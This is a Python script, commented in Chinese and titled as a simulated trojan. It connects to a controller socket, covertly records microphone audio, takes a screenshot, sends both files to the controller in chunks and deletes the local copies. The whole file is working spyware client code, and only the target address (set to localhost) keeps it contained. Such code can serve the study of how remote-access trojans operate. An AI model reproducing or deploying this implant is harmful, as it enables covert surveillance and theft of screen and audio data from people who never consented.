# 模拟木马在服务器运行的脚本

import socket
import time
import pyautogui
import os
import struct
import pyaudio #和录音有关的模块
import wave

def socket_client():

    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #三次握手 四次挥手
    serverAddr = ('127.0.0.1',22222)
    print("Connecting...")
    client.connect(serverAddr)
    # 木马业务调用
    recAc(client)
    screen_shot(client)

def screen_shot(client):
    # while True
    print("截屏")
    # time.sleep(2)
    print("开始截屏")
    img = pyautogui.screenshot()

    #img.show()
    savefilename = f'localScreenShot_{time.time()}.jpg'
    img.save(savefilename)
    # 把文件转换为Bytes数据后，通过socket发送到控制端
    # 发送规则—将一个文件按特定的数据包大小分段，然后按顺序依次发送给控制端
    # 控制端将数据依次接收到后，按顺序写入文件还原
    # 发送前需要告之控制端木马将要发送的文件大小和名字
    sendFile(client,savefilename)
    os.remove(savefilename)

def sendFile(client,savefilename):
    print("文件分段发送")
    if os.path.isfile(savefilename):
        print("文件存在，可以发送")
        filebasename = bytes(os.path.basename(savefilename).encode('utf-8'))
        print(filebasename)
        filebasesize = os.stat(savefilename).st_size
        print(filebasesize)
        # 将上述数据压缩到数据包中发送给控制端
        filebasepack = struct.pack('128sl',filebasename,filebasesize)
        print(filebasepack)
        # 将文件信息发送给控制端
        client.send(filebasepack)
        # 分段发送文件
        fileobj = open(savefilename,'rb')
        while True:
            filedata = fileobj.read(1024)
            if not filedata:
                print(f'{savefilename}-文件数据读取完毕，并发送完成。')
                break
            client.send(filedata)


def recAc(client):
    RATE = 16000
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    CHUNK = 1024
    RECORD_SECONDS = 5
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,channels=CHANNELS,rate=RATE,input=True,frames_per_buffer=CHUNK)
    print(f"开始录音，支持录制{RECORD_SECONDS}s")
    frames = []
    for i in range(0,RATE//CHUNK*RECORD_SECONDS):
        data = stream.read(1024)
        frames.append(data)
    print(frames)
    print("录音结束")
    stream.stop_stream()
    stream.close()
    p.terminate()
    wavefilename = f'localWave_{time.time()}.wav'
    wf = wave.open(wavefilename,'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    sendFile(client,wavefilename)
    os.remove(wavefilename)

if __name__ == '__main__':
    socket_client()
